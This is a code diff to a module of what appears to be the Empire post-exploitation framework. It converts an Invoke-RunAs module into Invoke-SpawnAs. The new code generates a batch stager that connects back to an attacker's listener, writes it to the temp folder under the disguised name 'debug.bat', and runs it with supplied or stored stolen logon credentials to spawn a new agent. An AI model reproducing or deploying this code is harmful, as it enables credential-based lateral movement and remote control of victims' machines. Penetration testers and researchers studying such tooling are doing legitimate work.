@@ -5,11 +5,11 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Invoke-RunAs',
+            'Name': 'Invoke-SpawnAs',
 
-            'Author': ['rvrsh3ll (@424f424f)'],
+            'Author': ['rvrsh3ll (@424f424f)', '@harmj0y'],
 
-            'Description': ('Runas knockoff. Will bypass GPO path restrictions.'),
+            'Description': ('Spawn an agent with the specified logon credentials.'),
 
             'Background' : False,
 
@@ -17,7 +17,7 @@ class Module:
             
             'NeedsAdmin' : False,
 
-            'OpsecSafe' : True,
+            'OpsecSafe' : False,
             
             'MinPSVersion' : '2',
             
@@ -55,15 +55,25 @@ class Module:
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'Cmd' : {
-                'Description'   :   'Command to run.',
+            'Listener' : {
+                'Description'   :   'Listener to use.',
                 'Required'      :   True,
-                'Value'         :   'notepad.exe'
-            },
-            'ShowWindow' : {
-                'Description'   :   'Switch. Show the window for the created process instead of hiding it.',
-                'Required'      :   False,
                 'Value'         :   ''
+            },
+            'UserAgent' : {
+                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            },
+            'Proxy' : {
+                'Description'   :   'Proxy to use for request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            },
+            'ProxyCreds' : {
+                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
             }
         }
 
@@ -92,8 +102,6 @@ class Module:
         script = f.read()
         f.close()
 
-        script += "\nInvoke-RunAs "
-
         # if a credential ID is specified, try to parse
         credID = self.options["CredID"]['Value']
         if credID != "":
@@ -110,15 +118,38 @@ class Module:
                 self.options["UserName"]['Value'] = userName
             if password != "":
                 self.options["Password"]['Value'] = password
-        
 
-        for option,values in self.options.iteritems():
-            if option.lower() != "agent" and option.lower() != "credid":
-                if values['Value'] and values['Value'] != '':
-                    if values['Value'].lower() == "true":
-                        # if we're just adding a switch
-                        script += " -" + str(option)
-                    else:
-                        script += " -" + str(option) + " " + str(values['Value']) 
+        # extract all of our options
+        listenerName = self.options['Listener']['Value']
+        userAgent = self.options['UserAgent']['Value']
+        proxy = self.options['Proxy']['Value']
+        proxyCreds = self.options['ProxyCreds']['Value']
+
+        # generate the .bat launcher code to write out to the specified location
+        #   this is because the System.Diagnostics.ProcessStartInfo method appears
+        #   to have a length limit on the arguments passed :(
+        l = self.mainMenu.stagers.stagers['launcher_bat']
+        l.options['Listener']['Value'] = self.options['Listener']['Value']
+        l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
+        l.options['Proxy']['Value'] = self.options['Proxy']['Value']
+        l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
+        l.options['Delete']['Value'] = "True"
+        launcherCode = l.generate()
+
+        # PowerShell code to write the launcher.bat out
+        script += "$tempLoc = \"$env:temp\debug.bat\""
+        script += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
+        script += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
+        script += "\"Launcher bat written to $tempLoc `n\";\n"
+  
+        script += "\nInvoke-RunAs "
+        script += "-UserName %s " %(self.options["UserName"]['Value'])
+        script += "-Password %s " %(self.options["Password"]['Value'])
+
+        domain = self.options["Domain"]['Value']
+        if(domain and domain != ""):
+            script += "-Domain %s " %(domain)
+
+        script += "-Cmd \"$env:temp\debug.bat\""
 
         return script
